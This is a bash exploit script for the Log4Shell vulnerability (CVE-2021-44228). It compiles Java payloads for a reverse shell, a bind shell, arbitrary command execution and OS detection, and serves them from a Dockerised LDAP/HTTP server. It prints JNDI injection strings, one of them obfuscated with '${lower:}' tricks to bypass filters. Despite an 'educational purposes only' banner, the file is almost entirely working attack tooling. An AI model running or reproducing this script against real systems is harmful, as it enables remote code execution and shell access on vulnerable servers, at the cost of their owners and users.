#!/usr/bin/env bash
# Credits for marshalesec-0.0.3.jar go to https://github.com/RandomRobbieBF/marshalsec-jar
# Inspiration for reverse and bind shell was taken from https://github.com/ivan-sincek/java-reverse-tcp
# Detailed description of this vulnerability can be found at https://www.lunasec.io/docs/blog/log4j-zero-day/
# Original exploit can be found here: https://github.com/shanfenglan/apache_log4j_poc
set -e

# Determine if java and docker exist
if ! command -v javac &> /dev/null
then
   echo "javac could not be found"
   exit 1
elif ! command -v docker &> /dev/null
then
   echo "docker could not be found"
   exit 1
fi

script_name=$0
script_path=$(dirname `realpath $0`)

function header {
    echo "Exploit for CVE-2021-44228"
    echo "Project made for EDUCATIONAL PURPOSES ONLY."
    echo
    echo "This script creates local ldap and http servers that serve prepared scripts"
    echo "It can create reverse shell, bind shell, execute commands via RCE (even piped ones) and detect os"
    echo "It requires docker so LDAP runs in an isolated environment (why? why not, more isolation - more fun)"
    echo
}

function usage {
    echo "Usage: $script_name -i IP -l LDAP_PORT -t HTTP_PORT -e EXPLOIT_TYPE"
    echo
    echo "Mandatory arguments:"
    echo "   -i, --ip           Specifies local IP"
    echo "   -l, --ldap-port    Specifies port for LDAP server"
    echo "   -t, --http-port    Specifies port for HTTP server"
    echo "   -e, --exploit      Specifies type of exploit (bind, reverse or rce)"
    echo
    echo "Mandatory for 'bind' exploit type"
    echo "   --remote-port      Specifies remote port for bind shell"
    echo
    echo "Mandatory for 'reverse' and 'detect' exploit type"
    echo "   --listener-port    Specifies local port for reverse shell"
    echo
    echo "Mandatory for 'rce' exploit type"
    echo "   --cmd              Specifies command for rce"
    echo
    echo "Optional arguments:"
    echo "   -h, --help        Displays this help"
    echo
    echo "FOR EDUCATIONAL PURPOSES ONLY"
    exit 1
}


function ctrl_c() {
	echo
	echo "Closing..."
    echo
    docker rm -f exploit-server 2>/dev/null
    rm "$script_path/server/scripts/exploit.class" 2>/dev/null
    rm "$script_path/server/scripts/exploit.java" 2>/dev/null
	exit 1
}
trap ctrl_c INT

# Loop that sets arguments for the script
while [ -n "$1" ]; do 
	case "$1" in
	   -h|--help) 
            header
            usage
            exit;;
	   -i|--ip)
            LOCAL_IP=$2
            shift
            ;;
	   -l|--ldap-port)
            LDAP_PORT=$2
            shift
            ;;
	   -t|--http-port)
            HTTP_PORT=$2
            shift
            ;;
	   -e|--exploit)
            EXPLOIT_TYPE=$2
            shift
            ;;
	   --cmd)
            rce_cmd=$2
            shift
            ;;
	   --listener-port)
            listener_port=$2
            shift
            ;;
	   --remote-port)
            remote_port=$2
            shift
            ;;
        *) 
            echo "Option '$1' is not recognized"
            echo
            usage
            exit 1
            ;;
    esac
    shift
done

# Check mandatory arguments
if [ -z "$LOCAL_IP" ]; then
   echo "Local ip cannot be empty - specify IP"
   usage
   exit 1
fi
if [ -z "$LDAP_PORT" ]; then
   echo "Local ldap port cannot be empty - specify port"
   usage
   exit 1
fi
if [ -z "$HTTP_PORT" ]; then
   echo "Local http port cannot be empty - specify port"
   usage
   exit 1
fi
if [ -z "$EXPLOIT_TYPE" ]; then
   echo "Exploit type cannot be empty"
   usage
   exit 1
fi

# Verify arguments
if [ "$EXPLOIT_TYPE" != "bind" ] && [ "$EXPLOIT_TYPE" != "reverse" ] \
    && [ "$EXPLOIT_TYPE" != "rce" ] && [ "$EXPLOIT_TYPE" != "osdetect" ] && [ "$EXPLOIT_TYPE" != "vulndetect" ]; then
    echo "Wrong exploit type"
    echo "Should be one of: bind, reverse, rce"
    echo
    usage
fi
if [ "$EXPLOIT_TYPE" == "bind" ] && [ -z "$remote_port" ]; then
   echo "Remote port for bind shell cannot be empty"
   usage
   exit 1
fi
if [ "$EXPLOIT_TYPE" == "reverse" ] && [ -z "$listener_port" ]; then
   echo "Local listener port for reverse shell cannot be empty"
   usage
   exit 1
fi
if [ "$EXPLOIT_TYPE" == "rce" ] && [ -z "$rce_cmd" ]; then
   echo "Command for RCE cannot be empty"
   usage
   exit 1
fi
if [ "$EXPLOIT_TYPE" == "osdetect" ] && [ -z "$listener_port" ]; then
   echo "Local listener port for detect cannot be empty"
   usage
   exit 1
fi

TARGET_JAVA_EXPLOIT="$script_path/server/scripts/exploit.java"
TARGET_JAVA_EXPLOIT_COMPILED="$script_path/server/scripts/exploit.class"

if [ "$EXPLOIT_TYPE" == "bind" ]; then
    echo "Chosen exploit type: bind"
    cp "$script_path/server/scripts/BindShell.java" $TARGET_JAVA_EXPLOIT
    sed -i "s/REMOTE_PORT/$remote_port/" $TARGET_JAVA_EXPLOIT
    javac $TARGET_JAVA_EXPLOIT && rm $TARGET_JAVA_EXPLOIT
elif [ "$EXPLOIT_TYPE" == "reverse" ]; then
    echo "Chosen exploit type: reverse"
    cp "$script_path/server/scripts/ReverseShell.java" $TARGET_JAVA_EXPLOIT
    sed -i "s/LOCAL_PORT/$listener_port/" $TARGET_JAVA_EXPLOIT
    sed -i "s/LOCAL_IP/$LOCAL_IP/" $TARGET_JAVA_EXPLOIT
    javac $TARGET_JAVA_EXPLOIT && rm $TARGET_JAVA_EXPLOIT
elif [ "$EXPLOIT_TYPE" == "rce" ]; then
    echo "Chosen exploit type: rce"
    cp "$script_path/server/scripts/Execute.java" $TARGET_JAVA_EXPLOIT
    sed -i "s:COMMAND:$rce_cmd:" $TARGET_JAVA_EXPLOIT
    javac $TARGET_JAVA_EXPLOIT && rm $TARGET_JAVA_EXPLOIT
elif [ "$EXPLOIT_TYPE" == "osdetect" ]; then
    echo "Chosen exploit type: detect"
    cp "$script_path/server/scripts/OSDetect.java" $TARGET_JAVA_EXPLOIT
    sed -i "s/LOCAL_PORT/$listener_port/" $TARGET_JAVA_EXPLOIT
    sed -i "s/LOCAL_IP/$LOCAL_IP/" $TARGET_JAVA_EXPLOIT
    javac $TARGET_JAVA_EXPLOIT && rm $TARGET_JAVA_EXPLOIT
elif [ "$EXPLOIT_TYPE" == "vulndetect" ]; then
    echo "Chosen exploit type: vulndetect"
    cp "$script_path/server/scripts/TimeBasedVulnDetect.java" $TARGET_JAVA_EXPLOIT
    javac $TARGET_JAVA_EXPLOIT && rm $TARGET_JAVA_EXPLOIT
else
    echo "Wrong exploit type"
    echo
    usage
fi

echo "Building local exploit server in container"
docker build -f "$script_path/server/Dockerfile" -t exploit-server "$script_path/server" 1>/dev/null

rm $TARGET_JAVA_EXPLOIT_COMPILED

echo
echo "Your payload:"
echo "\${jndi:ldap://$LOCAL_IP:$LDAP_PORT/a}"
echo "Your payload with bypass:"
echo "\${\${lower:j}ndi:\${lower:l}\${lower:d}a\${lower:p}://$LOCAL_IP:$LDAP_PORT/a}"
echo

read -p "Press enter to start local server"

echo "Starting local exploit server in container"
echo "Press CTRL-C to quit"
echo
docker run -it --rm \
    -p $LOCAL_IP:$LDAP_PORT:1389 -p $LOCAL_IP:$HTTP_PORT:$HTTP_PORT \
    -e HTTP_HOST=$LOCAL_IP -e HTTP_PORT=$HTTP_PORT -e HOST_LDAP_PORT=$LDAP_PORT \
    --name exploit-server exploit-server 

